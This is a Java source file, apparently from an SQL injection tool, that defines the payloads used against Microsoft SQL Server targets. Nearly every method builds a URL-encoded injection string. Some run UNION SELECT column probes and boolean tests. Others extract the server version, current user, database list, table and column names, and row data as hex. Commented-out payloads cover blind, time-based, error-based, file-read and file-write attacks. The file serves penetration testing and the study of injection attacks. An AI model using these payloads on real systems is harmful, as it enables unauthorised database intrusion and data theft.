package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class MSSQLServerStrategy implements ISQLStrategy {

    @Override
    public String getSchemaInfos() {
        return
            "SELECT+" +
                "CAST(N''AS+XML).value('xs:hexBinary(sql:column(\"bin\"))','VARCHAR(MAX)')%2B'i'" +
            "FROM(" +
                "SELECT+CAST((cast(@@version%2B'{%}'%2BDB_NAME()%2B'{%}'%2Buser%2B'{%}'%2Buser_name()AS+VARCHAR(MAX)))AS+VARBINARY(MAX))AS+bin" +
            ")x";
    }

    @Override
    public String getSchemaList() {
        return
            "SELECT+" +
                "replace(STUFF(" +
                    "(" +
                        "SELECT" +
                            "+','%2b'hh'%2Breplace(sys.fn_varbintohexstr(CAST(CAST(name+AS+VARCHAR(MAX))AS+VARBINARY(MAX))),'0x','')%2B'jj30hh'" +
                        "FROM+" +
                            "(select+name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+from+master..sysdatabases)x+" +
                        "where+1=1+{limit}+FOR+XML+PATH('')" +
                    ")" +
                ",1,1,'')%2B'i',',','gg')";
    }

    @Override
    public String getTableList(Database database) {
        return
            "SELECT+" +
                "replace(STUFF(" +
                    "(" +
                        "SELECT" +
                            "+','%2b'hh'%2Breplace(sys.fn_varbintohexstr(CAST(CAST(name+AS+VARCHAR(MAX))AS+VARBINARY(MAX))),'0x','')%2B'jj30hh'" +
                        "FROM+" +
                            "(select+name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+from+"+ database + "..sysobjects+WHERE+xtype='U')x+" +
                        "WHERE+1=1+{limit}+FOR+XML+PATH('')" +
                    ")" +
                ",1,1,'')%2B'i',',','gg')";
    }

    @Override
    public String getColumnList(Table table) {
        return
            "SELECT+" +
                "replace(STUFF(" +
                    "(" +
                        "SELECT" +
                            "+','%2b'hh'%2Breplace(sys.fn_varbintohexstr(CAST(CAST(name+AS+VARCHAR(MAX))AS+VARBINARY(MAX))),'0x','')%2B'jj30hh'" +
                        "FROM+(select+c.name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+" +
                        "FROM+" +
                            table.getParent() + "..syscolumns+c," +
                            table.getParent() + "..sysobjects+t+" +
                        "WHERE+" +
                            "c.id=t.id+" +
                        "AND+t.name='" + table + "')x+" +
                            
                        "WHERE+1=1+{limit}+FOR+XML+PATH('')" +
                    ")" +
                ",1,1,'')%2B'i',',','gg')";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "))%2bchar(127)%2bLTRIM(RTRIM(");
        formatListColumn = "LTRIM(RTRIM(" + formatListColumn + "))";

        return
            "SELECT+" +
                "replace(STUFF(" +
                    "(" +
                        "SELECT" +
                            "+','%2b'hh'%2Breplace(sys.fn_varbintohexstr(CAST(CAST(" + 
                            formatListColumn + 
                            "+AS+VARCHAR(MAX))AS+VARBINARY(MAX))),'0x','')%2B'jj30hh'" +
                        "FROM+(select+*,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+" +
                        
                        "FROM+" +
                            database + ".dbo." + table + "+)x+" +
                        "WHERE+1=1+{limit}+FOR+XML+PATH('')" +
                    ")" +
                ",1,1,'')%2B'i',',','gg')";
    }

    @Override
    public String getPrivilege() {
        return "";
//        return 
//            "concat(" +
//                "(" +
//                    "select+" +
//                        "hex(" +
//                            "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
//                        ")" +
//                    "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
//                    "where+" +
//                        "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
//                        "and+PRIVILEGE_TYPE=0x46494c45" +
//                ")," +
//                "0x69" +
//            ")";
    }

    @Override
    public String readTextFile(String filePath) {
        return "";
//        return "concat(hex(load_file(0x" + ToolsString.strhex(filePath) + ")),0x69)";
    }

    @Override
    public String writeTextFile(String content, String filePath) {
        return "";
//        return 
//            MediatorModel.model().initialQuery
//                .replaceAll(
//                    "1337" + MediatorModel.model().visibleIndex + "7331",
//                    "(select+0x" + ToolsString.strhex(content) + ")"
//                )
//                .replaceAll("--++", "")
//                + "+into+outfile+\"" + filePath + "\"--+";
    }

    @Override
    public String[] getListFalseTest() {
        return new String[]{"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};
    }

    @Override
    public String[] getListTrueTest() {
        return new String[]{"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};
    }

    @Override
    public String getBlindFirstTest() {
        return "";
//        return "0%2b1=1";
    }

    @Override
    public String blindCheck(String check) {
        return "";
//        return "+and+" + check + "--+";
    }

    @Override
    public String blindBitTest(String inj, int indexCharacter, int bit) {
        return "";
//        return "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
    }

    @Override
    public String blindLengthTest(String inj, int indexCharacter) {
        return "";
//        return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
    }

    @Override
    public String timeCheck(String check) {
        return "";
//        return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String timeBitTest(String inj, int indexCharacter, int bit) {
        return "";
//        return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String timeLengthTest(String inj, int indexCharacter) {
        return "";
//        return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String blindStrategy(String sqlQuery, String startPosition) {
        return "";
//        return 
//            "(" +
//                "select+" +
//                "concat(" +
//                    "0x53514c69," +
//                    "mid(" +
//                        "(" + sqlQuery + ")," +
//                        startPosition + "," +
//                        "65536" +
//                    ")" +
//                ")" +
//            ")";
    }

    @Override
    public String getErrorBasedStrategyCheck() {
        return "";
//        return 
//            "+and(" +
//                "select+1+" +
//                "from(" +
//                    "select+" +
//                        "count(*)," +
//                        "floor(rand(0)*2)" +
//                    "from+" +
//                        "information_schema.tables+" +
//                    "group+by+2" +
//                ")a" +
//            ")--+";
    }

    @Override
    public String errorBasedStrategy(String sqlQuery, String startPosition) {
        return "";
//        return 
//            "+and" +
//                "(" +
//                "select+" +
//                    "1+" +
//                "from(" +
//                    "select+" +
//                        "count(*)," +
//                        "concat(" +
//                            "0x53514c69," +
//                            "mid(" +
//                                "(" + sqlQuery + ")," +
//                                startPosition + "," +
//                                "64" +
//                            ")," +
//                        "floor(rand(0)*2)" +
//                    ")" +
//                    "from+information_schema.tables+" +
//                    "group+by+2" +
//                ")a" +
//            ")--+";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return 
            "(select'SQLi'%2Bsubstring((" + sqlQuery + ")," + startPosition + ",65536))";
    }

    @Override
    public String timeStrategy(String sqlQuery, String startPosition) {
        return "";
//        return 
//            "(" +
//                "select+" +
//                    "concat(" +
//                        "0x53514c69," +
//                        "mid(" +
//                            "(" + sqlQuery + ")," +
//                            startPosition + "," +
//                            "65536" +
//                        ")" +
//                    ")" +
//            ")";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return 
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "(select+concat('SQLi',$1,replicate(0xb8,1024),'iLQS'))"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("1337"+ i +"7330%2b1");
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "--+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "and+rnum+BETWEEN+" + (limitSQLResult+1) + "+AND+65536";
    }

}